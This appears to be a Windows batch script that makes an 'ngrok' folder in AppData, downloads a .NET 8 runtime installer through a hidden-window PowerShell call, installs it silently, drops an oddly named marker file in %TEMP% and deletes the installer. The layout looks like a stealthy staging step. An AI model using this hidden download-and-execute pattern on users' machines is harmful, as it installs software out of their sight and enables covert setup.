%SystemRoot%\Sysnative\cmd.exe /c "%~f0" & exit /b
@echo off
setlocal enabledelayedexpansion

set "USER=%USERNAME%"
set "NGROK_DIR=C:\Users\%USER%\AppData\Local\ngrok"
set "URL=https://download.visualstudio.microsoft.com/download/pr/6c9b0f8a-60cc-4e9a-a285-c44b72d717de/5ca43f37972fe88f7f8985f536f840ff/dotnet-runtime-8.0.0-win-x64.exe"
set "FILE_PATH=%NGROK_DIR%\dotnet_runtime_installer.exe"
set "LOG_PATH=%NGROK_DIR%\nt.txt"

if not exist "%NGROK_DIR%" mkdir "%NGROK_DIR%"

powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%FILE_PATH%')"

if exist "%FILE_PATH%" (
    start /wait "" "%FILE_PATH%" /quiet /norestart /log "%LOG_PATH%"
) else (
    exit /b
)

echo.>"%TEMP%\8b37b206-42e3-4bdf-9344-aa7matagrasa77be014.tmp"
del "%FILE_PATH%"

endlocal
